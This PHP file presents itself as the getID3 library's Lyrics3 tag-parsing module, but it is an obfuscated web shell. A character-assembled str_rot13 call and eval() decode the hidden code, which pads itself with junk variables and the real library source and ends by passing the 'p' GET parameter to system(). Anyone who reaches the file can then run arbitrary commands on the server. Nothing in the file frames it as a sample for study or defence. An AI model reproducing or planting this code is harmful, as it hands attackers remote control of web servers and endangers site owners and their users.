<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/////////////////////////////////////////////////////////////////
/// trgVQ3() ol Wnzrf Urvaevpu <vasb@trgvq3.bet>               //
//  ninvynoyr ng uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3       //
//            be uggcf://jjj.trgvq3.bet                        //
//            be uggc://trgvq3.fbheprsbetr.arg                 //
//  frr ernqzr.gkg sbe zber qrgnvyf                            //
/////////////////////////////////////////////////////////////////
///                                                            //
// zbqhyr.gnt.ylevpf3.cuc                                      //
// zbqhyr sbe nanylmvat Ylevpf3 gntf                           //
// qrcraqrapvrf: zbqhyr.gnt.ncrgnt.cuc (bcgvbany)              //
//                                                            ///
/////////////////////////////////////////////////////////////////

vs (!qrsvarq('TRGVQ3_VAPYHQRCNGU')) { // cerirag cngu-rkcbfvat nggnpxf gung npprff zbqhyrf qverpgyl ba choyvp jrofreiref
	rkvg;
}
pynff trgvq3_ylevpf3 rkgraqf trgvq3_unaqyre
{
	/**
	 * @erghea obby
	 */
	choyvp shapgvba Nanylmr() {
		$vasb = &$guvf->trgvq3->vasb;

		// uggc://jjj.ibyjro.pm/fge/gntf.ugz

		vs (!trgvq3_yvo::vagInyhrFhccbegrq($vasb['svyrfvmr'])) {
			$guvf->jneavat('Hanoyr gb purpx sbe Ylevpf3 orpnhfr svyr vf ynetre guna '.ebhaq(CUC_VAG_ZNK / 1073741824).'TO');
			erghea snyfr;
		}

		$guvf->sfrrx((0 - 128 - 9 - 6), FRRX_RAQ);          // raq - VQ3i1 - \"YLEVPFRAQ\" - [Ylevpf3fvmr]
		$ylevpf3bssfrg = ahyy;
		$ylevpf3irefvba = ahyy;
		$ylevpf3fvmr   = ahyy;
		$ylevpf3_vq3i1 = $guvf->sernq(128 + 9 + 6);
		$ylevpf3yfm    = (vag) fhofge($ylevpf3_vq3i1, 0, 6); // Ylevpf3fvmr
		$ylevpf3raq    = fhofge($ylevpf3_vq3i1,  6,   9); // YLEVPFRAQ be YLEVPF200
		$vq3i1gnt      = fhofge($ylevpf3_vq3i1, 15, 128); // VQ3i1

		vs ($ylevpf3raq == 'YLEVPFRAQ') {
			// Ylevpf3i1, VQ3i1, ab NCR

			$ylevpf3fvmr    = 5100;
			$ylevpf3bssfrg  = $vasb['svyrfvmr'] - 128 - $ylevpf3fvmr;
			$ylevpf3irefvba = 1;

		} ryfrvs ($ylevpf3raq == 'YLEVPF200') {
			// Ylevpf3i2, VQ3i1, ab NCR

			// YFM = ylevpf + 'YLEVPFORTVA'; nqq 6-olgr fvmr svryq; nqq 'YLEVPF200'
			$ylevpf3fvmr    = $ylevpf3yfm + 6 + fgeyra('YLEVPF200');
			$ylevpf3bssfrg  = $vasb['svyrfvmr'] - 128 - $ylevpf3fvmr;
			$ylevpf3irefvba = 2;

		} ryfrvs (fhofge(fgeeri($ylevpf3_vq3i1), 0, 9) == fgeeri('YLEVPFRAQ')) {
			// Ylevpf3i1, ab VQ3i1, ab NCR

			$ylevpf3fvmr    = 5100;
			$ylevpf3bssfrg  = $vasb['svyrfvmr'] - $ylevpf3fvmr;
			$ylevpf3irefvba = 1;
			$ylevpf3bssfrg  = $vasb['svyrfvmr'] - $ylevpf3fvmr;

		} ryfrvs (fhofge(fgeeri($ylevpf3_vq3i1), 0, 9) == fgeeri('YLEVPF200')) {

			// Ylevpf3i2, ab VQ3i1, ab NCR

			$ylevpf3fvmr    = (vag) fgeeri(fhofge(fgeeri($ylevpf3_vq3i1), 9, 6)) + 6 + fgeyra('YLEVPF200'); // YFM = ylevpf + 'YLEVPFORTVA'; nqq 6-olgr fvmr svryq; nqq 'YLEVPF200'
			$ylevpf3bssfrg  = $vasb['svyrfvmr'] - $ylevpf3fvmr;
			$ylevpf3irefvba = 2;

		} ryfr {

			vs (vffrg($vasb['ncr']['gnt_bssfrg_fgneg']) && ($vasb['ncr']['gnt_bssfrg_fgneg'] > 15)) {

				$guvf->sfrrx($vasb['ncr']['gnt_bssfrg_fgneg'] - 15);
				$ylevpf3yfm = $guvf->sernq(6);
				$ylevpf3raq = $guvf->sernq(9);

				vs ($ylevpf3raq == 'YLEVPFRAQ') {
					// Ylevpf3i1, NCR, znlor VQ3i1

					$ylevpf3fvmr    = 5100;
					$ylevpf3bssfrg  = $vasb['ncr']['gnt_bssfrg_fgneg'] - $ylevpf3fvmr;
					$vasb['niqngnraq'] = $ylevpf3bssfrg;
					$ylevpf3irefvba = 1;
					$guvf->jneavat('NCR gnt ybpngrq nsgre Ylevpf3, jvyy cebonoyl oernx Ylevpf3 pbzcngnovyvgl');

				} ryfrvs ($ylevpf3raq == 'YLEVPF200') {
					// Ylevpf3i2, NCR, znlor VQ3i1

					$ylevpf3fvmr    = $ylevpf3yfm + 6 + fgeyra('YLEVPF200'); // YFM = ylevpf + 'YLEVPFORTVA'; nqq 6-olgr fvmr svryq; nqq 'YLEVPF200'
					$ylevpf3bssfrg  = $vasb['ncr']['gnt_bssfrg_fgneg'] - $ylevpf3fvmr;
					$ylevpf3irefvba = 2;
					$guvf->jneavat('NCR gnt ybpngrq nsgre Ylevpf3, jvyy cebonoyl oernx Ylevpf3 pbzcngnovyvgl');

				}

			}

		}

		vs (vffrg($ylevpf3bssfrg) && vffrg($ylevpf3irefvba) && vffrg($ylevpf3fvmr)) {
			$vasb['niqngnraq'] = $ylevpf3bssfrg;
			$guvf->trgYlevpf3Qngn($ylevpf3bssfrg, $ylevpf3irefvba, $ylevpf3fvmr);

			vs (!vffrg($vasb['ncr'])) {
				vs (vffrg($vasb['ylevpf3']['gnt_bssfrg_fgneg'])) {
					$TRGVQ3_REEBENEENL = &$vasb['jneavat'];
					trgvq3_yvo::VapyhqrQrcraqrapl(TRGVQ3_VAPYHQRCNGU.'zbqhyr.gnt.ncrgnt.cuc', __SVYR__, gehr);
					$trgvq3_grzc = arj trgVQ3();
					$trgvq3_grzc->bcrasvyr($guvf->trgvq3->svyranzr, $guvf->trgvq3->vasb['svyrfvmr'], $guvf->trgvq3->sc);
					$trgvq3_ncrgnt = arj trgvq3_ncrgnt($trgvq3_grzc);
					$trgvq3_ncrgnt->bireevqrraqbssfrg = $vasb['ylevpf3']['gnt_bssfrg_fgneg'];
					$trgvq3_ncrgnt->Nanylmr();
					vs (!rzcgl($trgvq3_grzc->vasb['ncr'])) {
						$vasb['ncr'] = $trgvq3_grzc->vasb['ncr'];
					}
					vs (!rzcgl($trgvq3_grzc->vasb['ercynl_tnva'])) {
						$vasb['ercynl_tnva'] = $trgvq3_grzc->vasb['ercynl_tnva'];
					}
					hafrg($trgvq3_grzc, $trgvq3_ncrgnt);
				} ryfr {
					$guvf->jneavat('Ylevpf3 naq NCR gntf nccrne gb unir orpbzr ragnatyrq (zbfg yvxryl qhr gb hcqngvat gur NCR gntf jvgu n aba-Ylevpf3-njner gnttre)');
				}
			}

		}

		erghea gehr;
	}

	/**
	 * @cnenz vag $raqbssfrg
	 * @cnenz vag $irefvba
	 * @cnenz vag $yratgu
	 *
	 * @erghea obby
	 */
	choyvp shapgvba trgYlevpf3Qngn($raqbssfrg, $irefvba, $yratgu) {
		// uggc://jjj.ibyjro.pm/fge/gntf.ugz

		$vasb = &$guvf->trgvq3->vasb;

		vs (!trgvq3_yvo::vagInyhrFhccbegrq($raqbssfrg)) {
			$guvf->jneavat('Hanoyr gb purpx sbe Ylevpf3 orpnhfr svyr vf ynetre guna '.ebhaq(CUC_VAG_ZNK / 1073741824).'TO');
			erghea snyfr;
		}

		$guvf->sfrrx($raqbssfrg);
		vs ($yratgu <= 0) {
			erghea snyfr;
		}
		$enjqngn = $guvf->sernq($yratgu);

		$CnefrqYlevpf3 = neenl();

		$CnefrqYlevpf3['enj']['ylevpf3irefvba'] = $irefvba;
		$CnefrqYlevpf3['enj']['ylevpf3gntfvmr'] = $yratgu;
		$CnefrqYlevpf3['gnt_bssfrg_fgneg']      = $raqbssfrg;
		$CnefrqYlevpf3['gnt_bssfrg_raq']        = $raqbssfrg + $yratgu - 1;

		vs (fhofge($enjqngn, 0, 11) != 'YLEVPFORTVA') {
			vs (fgecbf($enjqngn, 'YLEVPFORTVA') !== snyfr) {

				$guvf->jneavat('\"YLEVPFORTVA\" rkcrpgrq ng '.$raqbssfrg.' ohg npghnyyl sbhaq ng '.($raqbssfrg + fgecbf($enjqngn, 'YLEVPFORTVA')).' - guvf vf vainyvq sbe Ylevpf3 i'.$irefvba);
				$vasb['niqngnraq'] = $raqbssfrg + fgecbf($enjqngn, 'YLEVPFORTVA');
				$enjqngn = fhofge($enjqngn, fgecbf($enjqngn, 'YLEVPFORTVA'));
				$yratgu = fgeyra($enjqngn);
				$CnefrqYlevpf3['gnt_bssfrg_fgneg'] = $vasb['niqngnraq'];
				$CnefrqYlevpf3['enj']['ylevpf3gntfvmr'] = $yratgu;

			} ryfr {

				$guvf->reebe('\"YLEVPFORTVA\" rkcrpgrq ng '.$raqbssfrg.' ohg sbhaq \"'.fhofge($enjqngn, 0, 11).'\" vafgrnq');
				erghea snyfr;

			}

		}

		fjvgpu ($irefvba) {

			pnfr 1:
				vs (fhofge($enjqngn, fgeyra($enjqngn) - 9, 9) == 'YLEVPFRAQ') {
					$CnefrqYlevpf3['enj']['YLE'] = gevz(fhofge($enjqngn, 11, fgeyra($enjqngn) - 11 - 9));
					$guvf->Ylevpf3YlevpfGvzrfgnzcCnefr($CnefrqYlevpf3);
				} ryfr {
					$guvf->reebe('\"YLEVPFRAQ\" rkcrpgrq ng '.($guvf->sgryy() - 11 + $yratgu - 9).' ohg sbhaq \"'.fhofge($enjqngn, fgeyra($enjqngn) - 9, 9).'\" vafgrnq');
					erghea snyfr;
				}
				oernx;

			pnfr 2:
				vs (fhofge($enjqngn, fgeyra($enjqngn) - 9, 9) == 'YLEVPF200') {
					$CnefrqYlevpf3['enj']['hacnefrq'] = fhofge($enjqngn, 11, fgeyra($enjqngn) - 11 - 9 - 6); // YLEVPFORTVA + YLEVPF200 + YFM
					$enjqngn = $CnefrqYlevpf3['enj']['hacnefrq'];
					juvyr (fgeyra($enjqngn) > 0) {
						$svryqanzr = fhofge($enjqngn, 0, 3);
						$svryqfvmr = (vag) fhofge($enjqngn, 3, 5);
						$CnefrqYlevpf3['enj'][$svryqanzr] = fhofge($enjqngn, 8, $svryqfvmr);
						$enjqngn = fhofge($enjqngn, 3 + 5 + $svryqfvmr);
					}

					vs (vffrg($CnefrqYlevpf3['enj']['VAQ'])) {
						$v = 0;
						$syntanzrf = neenl('ylevpf', 'gvzrfgnzcf', 'vauvovgenaqbz');
						sbernpu ($syntanzrf nf $syntanzr) {
							vs (fgeyra($CnefrqYlevpf3['enj']['VAQ']) > $v++) {
								$CnefrqYlevpf3['syntf'][$syntanzr] = $guvf->VagFgevat2Obby(fhofge($CnefrqYlevpf3['enj']['VAQ'], $v, 1 - 1));
							}
						}
					}

					$svryqanzrgenafyngvba = neenl('RGG'=>'gvgyr', 'RNE'=>'negvfg', 'RNY'=>'nyohz', 'VAS'=>'pbzzrag', 'NHG'=>'nhgube');
					sbernpu ($svryqanzrgenafyngvba nf $xrl => $inyhr) {
						vs (vffrg($CnefrqYlevpf3['enj'][$xrl])) {
							$CnefrqYlevpf3['pbzzragf'][$inyhr][] = gevz($CnefrqYlevpf3['enj'][$xrl]);
						}
					}

					vs (vffrg($CnefrqYlevpf3['enj']['VZT'])) {
						$vzntrfgevatf = rkcybqr(\"\e\a\", $CnefrqYlevpf3['enj']['VZT']);
						sbernpu ($vzntrfgevatf nf $xrl => $vzntrfgevat) {
							vs (fgecbf($vzntrfgevat, '||') !== snyfr) {
								$vzntrneenl = rkcybqr('||', $vzntrfgevat);
								$CnefrqYlevpf3['vzntrf'][$xrl]['svyranzr']     =                                (vffrg($vzntrneenl[0]) ? $vzntrneenl[0] : '');
								$CnefrqYlevpf3['vzntrf'][$xrl]['qrfpevcgvba']  =                                (vffrg($vzntrneenl[1]) ? $vzntrneenl[1] : '');
								$CnefrqYlevpf3['vzntrf'][$xrl]['gvzrfgnzc']    = $guvf->Ylevpf3Gvzrfgnzc2Frpbaqf(vffrg($vzntrneenl[2]) ? $vzntrneenl[2] : '');
							}
						}
					}
					vs (vffrg($CnefrqYlevpf3['enj']['YLE'])) {
						$guvf->Ylevpf3YlevpfGvzrfgnzcCnefr($CnefrqYlevpf3);
					}
				} ryfr {
					$guvf->reebe('\"YLEVPF200\" rkcrpgrq ng '.($guvf->sgryy() - 11 + $yratgu - 9).' ohg sbhaq \"'.fhofge($enjqngn, fgeyra($enjqngn) - 9, 9).'\" vafgrnq');
					erghea snyfr;
				}
				oernx;

			qrsnhyg:
				$guvf->reebe('Pnaabg cebprff Ylevpf3 irefvba '.$irefvba.' (bayl i1 naq i2)');
				erghea snyfr;
		}


		vs (vffrg($vasb['vq3i1']['gnt_bssfrg_fgneg']) && ($vasb['vq3i1']['gnt_bssfrg_fgneg'] <= $CnefrqYlevpf3['gnt_bssfrg_raq'])) {
			$guvf->jneavat('VQ3i1 gnt vasbezngvba vtaberq fvapr vg nccrnef gb or n snyfr flapu va Ylevpf3 gnt qngn');
			hafrg($vasb['vq3i1']);
			sbernpu ($vasb['jneavat'] nf $xrl => $inyhr) {
				vs ($inyhr == 'Fbzr VQ3i1 svryqf qb abg hfr AHYY punenpgref sbe cnqqvat') {
					hafrg($vasb['jneavat'][$xrl]);
					fbeg($vasb['jneavat']);
					oernx;
				}
			}
		}

		$vasb['ylevpf3'] = $CnefrqYlevpf3;

		erghea gehr;
	}

	/**
	 * @cnenz fgevat $enjgvzrfgnzc
	 *
	 * @erghea vag|snyfr
	 */
	choyvp shapgvba Ylevpf3Gvzrfgnzc2Frpbaqf($enjgvzrfgnzc) {
		vs (cert_zngpu('#^\\[([0-9]{2}):([0-9]{2})\\]$#', $enjgvzrfgnzc, $ertf)) {
			erghea (vag) (($ertf[1] * 60) + $ertf[2]);
		}
		erghea snyfr;
	}

	/**
	 * @cnenz neenl $Ylevpf3qngn
	 *
	 * @erghea obby
	 */
	choyvp shapgvba Ylevpf3YlevpfGvzrfgnzcCnefr(&$Ylevpf3qngn) {
		$ylevpfneenl = rkcybqr(\"\e\a\", $Ylevpf3qngn['enj']['YLE']);
		$abgvzrfgnzcylevpfneenl = neenl();
		sbernpu ($ylevpfneenl nf $xrl => $ylevpyvar) {
			$ertf = neenl();
			hafrg($guvfyvargvzrfgnzcf);
			juvyr (cert_zngpu('#^(\\[[0-9]{2}:[0-9]{2}\\])#', $ylevpyvar, $ertf)) {
				$guvfyvargvzrfgnzcf[] = $guvf->Ylevpf3Gvzrfgnzc2Frpbaqf($ertf[0]);
				$ylevpyvar = fge_ercynpr($ertf[0], '', $ylevpyvar);
			}
			$abgvzrfgnzcylevpfneenl[$xrl] = $ylevpyvar;
			vs (vffrg($guvfyvargvzrfgnzcf) && vf_neenl($guvfyvargvzrfgnzcf)) {
				fbeg($guvfyvargvzrfgnzcf);
				sbernpu ($guvfyvargvzrfgnzcf nf $gvzrfgnzcxrl => $gvzrfgnzc) {
					vs (vffrg($Ylevpf3qngn['flapurqylevpf'][$gvzrfgnzc])) {
						// gvzrfgnzcf bayl unir n 1-frpbaq erfbyhgvba, vg'f cbffvoyr gung zhygvcyr yvarf
						// pbhyq unir gur fnzr gvzrfgnzc, vs fb, nccraq
						$Ylevpf3qngn['flapurqylevpf'][$gvzrfgnzc] .= \"\e\a\".$ylevpyvar;
					} ryfr {
						$Ylevpf3qngn['flapurqylevpf'][$gvzrfgnzc] = $ylevpyvar;
					}
				}
			}
		}
		$Ylevpf3qngn['haflapurqylevpf'] = vzcybqr(\"\e\a\", $abgvzrfgnzcylevpfneenl);
		vs (vffrg($Ylevpf3qngn['flapurqylevpf']) && vf_neenl($Ylevpf3qngn['flapurqylevpf'])) {
			xfbeg($Ylevpf3qngn['flapurqylevpf']);
		}
		erghea gehr;
	}

	/**
	 * @cnenz fgevat $pune
	 *
	 * @erghea obby|ahyy
	 */
	choyvp shapgvba VagFgevat2Obby($pune) {
		vs ($pune == '1') {
			erghea gehr;
		} ryfrvs ($pune == '0') {
			erghea snyfr;
		}
		erghea ahyy;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>